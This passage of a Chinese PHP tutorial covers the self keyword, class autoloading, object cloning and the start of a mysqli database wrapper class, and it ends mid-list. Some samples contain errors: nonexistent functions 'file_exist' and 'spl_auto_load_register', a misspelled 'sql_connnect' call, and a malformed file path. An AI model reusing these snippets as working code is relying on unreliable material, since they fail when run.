<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;			<span class="comment">//私有，不允许外部直接访问</span></span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$count</span>;				<span class="comment">//代替类名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>self也可以在类的内部方便实例化对象：比如构造方法被私有化之后，就没有办法在类外部实例化对象，此时可以在类内部进行对象实例化</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;			<span class="comment">//私有，不允许外部直接访问</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;	<span class="comment">//私有，不允许外部实例化（因为对象不能外部调用）</span></span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Saler();				<span class="comment">//使用类名实例化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();				<span class="comment">//使用self关键字实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = Saler::getInstance();</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>self是一种在类内部用来代替类名的关键字</li>
<li>self可以用来在类内部访问静态成员（类常量也可以）</li>
<li>self也可以在类内部用来实例化对象（代替类名：new self()）</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：类不管是直接访问静态成员还是先实例化然后访问类成员，都有一个前提：类必须在内存中存在，那是不是意味着所有的类操作之前，都必须先确认类在内存中是否存在呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：类的任何操作都需要确认类在内存存在的，不过类文件通常是一个类单独形成一个文件的。所以在操作之前需要进行类的加载。</p>
</blockquote>
<h3 id="13-类的加载【重要】"><a href="#13-类的加载【重要】" class="headerlink" title="13.类的加载【重要】"></a>13.类的加载【重要】</h3><blockquote>
<p><strong>定义</strong>：所谓类的加载，本质是因为类的访问必须保证类在内存中已经存在，所以需要在用类之前将类所在的PHP文件加载到内存。</p>
</blockquote>
<ol>
<li>手动加载：即要访问某个类之前，使用文件包含将类所在的文件加载进来</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">类文件：Saler.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">应用文件：useSaler.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//使用Saler类需要先包含Saler类所在的文件</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;Saler.php&#x27;</span>;				<span class="comment">//通常使用include_once，因为类不允许重名</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>加载类文件是一种比较消耗资源的方式，所以有的时候不确定类是否在内存中存在，可以事先使用class_exists()函数来判定是否存在，存在就不用加载，不存在才加载</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//使用Saler类，但是不确定内存中是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!class_exists(<span class="string">&#x27;Saler&#x27;</span>))&#123;</span><br><span class="line">	<span class="comment">//不存在：加载</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;Saler.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>自动加载：PHP没有那么智能的系统自动加载，所谓自动加载只是PHP提供了一种<code>加载机制</code>：即实现定义一个函数__autoload()，然后当系统需要使用类，而内存中又不存在的时候，系统就会自动调用__autoload()函数来加载类文件.</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//自动加载机制：利用系统提供的__autoload()函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;			<span class="comment">//参数为类名：即当前需要访问的类的名字</span></span><br><span class="line">	<span class="comment">//需要人为定义去哪加载，怎么加载   </span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;		<span class="comment">//假定为当前目录下，类文件名字为：类名.php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用类：内存目前并没有</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();							<span class="comment">//系统发现内存没有Saler，所以调用__autoload()去加载</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>一个系统里，可能类文件会放到不同的路径下，因此一个完整的自动加载函数，应该要进行文件判定以及加载功能</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义自动加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//组织文件路径：假设当前路径下，有两个文件夹下都有类c和m</span></span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;		<span class="comment">//如c/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//说明c文件夹没有对应的文件</span></span><br><span class="line">        <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;	<span class="comment">//如m/Saler.php</span></span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">            <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：自动加载是指按照开发者规定的路径去寻找对应的文件，并实现包含。如果文件不存在，那么系统会在使用类的时候报错，因为这是开发者自己犯的错，系统不能规避。</p>
<ol start="5">
<li>随着PHP版本的提升，在7以后，不怎么建议直接使用__autoload()函数，而是采用一种注册机制，将用户自定义的函数，放到系统内部，使用spl_autoload_register(定义好的函数)。本质与__autoload()一样</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个函数，用来加载类文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;		<span class="comment">//也需要一个参数来接收要加载的类名字</span></span><br><span class="line">    <span class="comment">//功能与__autoload()一样</span></span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;		<span class="comment">//如c/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//说明c文件夹没有对应的文件</span></span><br><span class="line">        <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;	<span class="comment">//如m/Saler.php</span></span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">            <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时，上述函数永远不会自动运行，除非将函数注册到系统内部</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;my_autoload&#x27;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：该方式其实本质就是通过两步完成了__autoload()一步的操作，但是spl_autoload_register()函数可以注册多个自定义的加载函数，更方便管理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;		</span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;		</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;		</span><br><span class="line">    <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;		</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全部注册</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;c_autoload&#x27;</span>);	<span class="comment">//先尝试调用第一个自定义加载函数：找到了结束；找不到找第二个函数</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;m_autoload&#x27;</span>);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Autoload</span></span>&#123;</span><br><span class="line">    <span class="comment">//实现不同文件夹的自动加载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadC</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span>.<span class="variable">$classname</span>.<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(file_exist(<span class="variable">$c_file</span>)) <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadM</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span>.<span class="variable">$classname</span>.<span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(file_exist(<span class="variable">$m_file</span>)) <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自动加载</span></span><br><span class="line">spl_auto_load_register(<span class="keyword">array</span>(<span class="string">&#x27;Autoload&#x27;</span>,<span class="string">&#x27;loadC&#x27;</span>));</span><br><span class="line">spl_auto_load_register(<span class="keyword">array</span>(<span class="string">&#x27;Autoload&#x27;</span>,<span class="string">&#x27;loadM&#x27;</span>));</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>类的使用必须先保证内存中该类存在</li>
<li>可以使用手动加载来确保类的使用安全：优点是明确，缺点是繁琐（类文件名字可以随意没有规范）</li>
<li>可以使用自动加载来让系统按照开发者设定的路径和方式去寻找类，并尝试加载到内存（尽量让类文件名字统一，保证类名和文件名有关联）</li>
<li>自动加载可以使用__autoload()函数来实现，也可以使用自定义函数+spl_autoload_register()注册共同实现（后者推荐）</li>
<li>基本上所有的框架都在使用自动加载机制</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：对象只能通过实例化产生，而且即使是将对象赋值给变量，得到的还是同一个对象。如果有的时候需要得到新的对象，除了实例化之外还有其他方法吗？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：对象理论上应该通过实例化来产生，这是对象产生的根本。但是有时候如果想在已有对象上去产生一个新的对象，可以通过<code>克隆</code>来实现。</p>
</blockquote>
<h3 id="14-对象克隆【了解】"><a href="#14-对象克隆【了解】" class="headerlink" title="14.对象克隆【了解】"></a>14.对象克隆【了解】</h3><blockquote>
<p><strong>定义</strong>：克隆对象clone，即通过已有的对象复制一个新的同样的对象，但是两者之间并非同一个对象。</p>
</blockquote>
<ol>
<li>对象克隆是通过clone关键字实现，即：clone 对象;</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>克隆出来的对象与原来对象是两个内存地址，因此是两个不同的对象</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="variable">$s2</span>-&gt;count = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s1</span>-&gt;count;		<span class="comment">//1，没有变化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>对象在实例化的时候会自动调用存在的构造方法__construct()，同样的，在类的内部，PHP允许定义一个__clone()的方法，在对象被克隆后，新克隆出来的对象会自动调用</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    <span class="comment">//克隆方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);			<span class="comment">//编号为2，代表是克隆出来的对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>如果不允许对象被克隆，可以将__clone()方法私有化（本质是不允许对象在外部被克隆）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    <span class="comment">//私有化克隆方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;			<span class="comment">//致命错误：不允许对象在外部访问一个私有方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>对象可以通过克隆来得到新的对象（以前只有实例化）</li>
<li>克隆出来的对象会自动调用类中对应的__clone()方法（如果有）</li>
<li>可以通过私有化克隆方法来实现禁止外部对象克隆</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：现在掌握了很多面向对象相关的内容，但是什么时候封装类？怎么封装类？如何使用类成员？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：其实类的封装并没有多么复杂，但是需要一个熟练的过程来确定哪些东西可以放到类里，该用什么样的形式等。我们通过封装一个数据库的操作类来综合练习一下。</p>
</blockquote>
<h3 id="15-封装数据库操作类【掌握】"><a href="#15-封装数据库操作类【掌握】" class="headerlink" title="15.封装数据库操作类【掌握】"></a>15.封装数据库操作类【掌握】</h3><blockquote>
<p><strong>定义</strong>：封装数据库操作类，即根据数据库的操作需求，来确认数据库操作类该有什么样的功能，以及这些功能该如何实现。</p>
</blockquote>
<ol>
<li>一个类通常就是一个文件，所以要先确定文件的名字：通常类文件命名规范有两种</li>
</ol>
<ul>
<li>文件名字与类名字一样，如Sql.php</li>
<li>为了区分普通PHP文件，增加中间类描述，如Sql.class.php</li>
<li>现在PHP几乎都是面向对象编程，所以通常采用第一种方式：因此当前命名数据类的文件为：Sql.php</li>
</ul>
<ol start="2">
<li>确定类文件名字后其实也就确定了类名字，因此可以创建一个Sql类</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//数据库操作类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sql</span></span>&#123;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>类的创建分两种：一是特定使用，即类里面的所有内容只为某次使用；二是通用，即工具类，以后很多地方可以用。</li>
</ol>
<ul>
<li>特定使用，功能可以不用太灵活</li>
<li>通用工具，功能应该大众化，数据的变化会比较多</li>
</ul>
<p>数据库类以后凡是要操作数据库的地方都可以用得到，很多项目都会用到，所以应该是个通用工具类，因此要考虑其到处可用的特性，让其能够灵活</p>
<ol start="4">
<li>数据库的操作最基本的特性不会改变：即需要连接认证，而连接认证的信息是灵活的，所以可以通过设定属性来控制，这些信息也都是不同使用者不同的，应该可以改变，所以可以通过构造方法来实现数据传入</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//数据库操作类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sql</span></span>&#123;</span><br><span class="line">	<span class="comment">//设置属性</span></span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$port</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$charset</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造方法初始化数据：数据较多，应该使用数组来传递数据，关联数组，而且绝大部分的开发者本意是用来测试，所以基本都是本地，因此可以给默认数据</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	$info = array(</span></span><br><span class="line"><span class="comment">    		&#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span></span><br><span class="line"><span class="comment">    		&#x27;port&#x27; =&gt; &#x27;3306&#x27;,</span></span><br><span class="line"><span class="comment">    		&#x27;user&#x27; =&gt; &#x27;root&#x27;,</span></span><br><span class="line"><span class="comment">    		&#x27;pass&#x27; =&gt; &#x27;root&#x27;,</span></span><br><span class="line"><span class="comment">    		&#x27;dbname&#x27; =&gt; &#x27;test&#x27;,</span></span><br><span class="line"><span class="comment">    		&#x27;charset&#x27; =&gt; &#x27;utf8&#x27;</span></span><br><span class="line"><span class="comment">    	)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//初始化：确保用户传入了数据，否则使用默认值</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;host = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;host&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;host&#x27;</span>] : <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;port = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;port&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;port&#x27;</span>] : <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;user&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;pass&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;pass&#x27;</span>] : <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dbname = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;dbname&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;dbname&#x27;</span>] : <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;charset = <span class="keyword">isset</span>(<span class="variable">$info</span>[<span class="string">&#x27;charset&#x27;</span>]) ? <span class="variable">$info</span>[<span class="string">&#x27;charset&#x27;</span>] : <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：方法设定的原则是一个方法只实现一个简单的功能，不要多个功能堆积到一个方法中。</p>
<ol start="5">
<li>数据库属性会在实例化Sql对象的时候自动初始化</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接上述代码（类外测试）</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Sql();			<span class="comment">//使用默认数据库信息</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;my_database&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> Sql(<span class="variable">$db</span>);			<span class="comment">//使用外部数据库信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>数据库要操作的第一件事就是连接认证，所以需要一个连接认证的功能。这里可以使用mysqli面向对象的方法。但是需要建立一个方法来实现连接认证：连接是否成功？</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在上述类中增加一个方法：实现连接认证功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_connect</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//利用属性可以跨方法访问：5个参数分别为：主机、用户名、密码、数据库、端口</span></span><br><span class="line">    <span class="comment">//利用错误抑制符抑制可能出现的错误：如找不到数据库之类</span></span><br><span class="line">	<span class="variable">$link</span> = @<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;host,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;pass,<span class="keyword">$this</span>-&gt;dbname,<span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment">//判定连接是否成功</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$link</span>-&gt;connect_error)&#123;</span><br><span class="line">        <span class="comment">//mysqli对象有两个属性：connect_errno表示错误编号，connect_error表示错误信息：发生错误后终止脚本执行</span></span><br><span class="line">		<span class="keyword">die</span>( <span class="string">&#x27;Connect Error (&#x27;</span>  .  <span class="variable">$link</span> -&gt; connect_errno  .  <span class="string">&#x27;) &#x27;</span> .  <span class="variable">$link</span> -&gt; connect_error );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>用户调用Sql类的目的一定是为了操作数据库，那么用户在实例化之后就需要调用连接认证的方法。为了方便用户操作，可以帮助用户省去调用这一步骤：在构造方法中调用该方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在上述构造方法中调用连接认证方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在属性初始化之后调用连接认证方法</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;sql_connnect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>至此，一旦实例化Sql类对象，就可以实现数据库的连接，但是此时还存在一个细节问题：字符集，为了保证数据库连接的正常操作，需要新增一个方法设定字符集</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在Sql类中增加设定字符集的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_charset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;set names <span class="subst">&#123;$this-&gt;charset&#125;</span>&quot;</span>;		<span class="comment">//组织SQL指令</span></span><br><span class="line">    <span class="comment">//此时需要调用mysqli连接数据库得到的对象：发现$link在sql_connect方法中是一个局部变量，不能跨方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="9">
